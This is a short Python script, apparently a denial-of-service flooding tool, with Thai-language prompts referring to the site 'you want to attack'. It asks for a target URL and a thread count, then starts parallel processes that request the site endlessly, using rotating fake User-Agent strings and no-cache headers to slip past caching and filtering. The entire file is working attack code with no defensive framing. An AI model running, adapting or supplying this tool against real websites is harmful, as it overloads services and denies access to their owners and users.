from urllib.request import urlopen,Request,URLError,HTTPError
import multiprocessing as mp
from fake_useragent import UserAgent
import os,sys
import time
import sys
num = 0
fakeUa = UserAgent()
url = input('URL => ')
if url == '':
	print('กรุณาใส่ URL ')
	sys.exit()
	
time = int(input('TIME : '))
th = int(input('THREAD : '))


def attack():	
	try:	
		while True:
			headers={'Cache-Control': 'no-cache','User-Agent':fakeUa.random}
			req = Request(url,headers=headers)
			html = urlopen(req)
			print("Attack " ,html.status,html.reason)	
			
	except HTTPError as e:
			
			print(e.code,e.reason)
	except:
			print ('Server Error')			
if __name__ == "__main__":
	
	try:
		headers={'Cache-Control': 'no-cache','User-Agent':fakeUa.random}
		req = Request(url,headers=headers,)
		html = urlopen(req)
		
	except URLError as e:
		print('ไม่เจอเว็บไซต์ที่คุณต้องการโจมตี')
		sys.exit()
		
	for i in range(th):
		mp.Process(target=attack).start()
		
